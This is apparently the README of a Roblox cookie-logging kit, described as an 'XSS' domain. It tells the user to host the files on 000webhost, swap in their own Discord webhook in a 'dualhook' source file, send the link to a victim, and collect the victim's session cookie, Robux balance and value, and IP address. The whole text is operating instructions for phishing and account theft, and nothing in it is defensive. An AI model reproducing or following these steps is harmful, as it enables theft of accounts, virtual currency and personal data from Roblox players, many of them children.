# Purposes
Website Logging: Roblox based

This file gives you acces to make a XSS - domain,
if you want to manage these files. Make a account/website on 000webhost.com to continue managing these files. You'll have to extract and place the files in there!

in the dualhook source file you'll find a discord webhook. Change the webhook with your own created Webhook!

Send your domain to a victim and wait till you get their informations:
- Cookie (JavaScript based)
- Robux Currency (JSON based)
- Robux Average Price (JSON based)
- Internet Protocol (SSo based)

if you are having problems you can always DM me via Discord
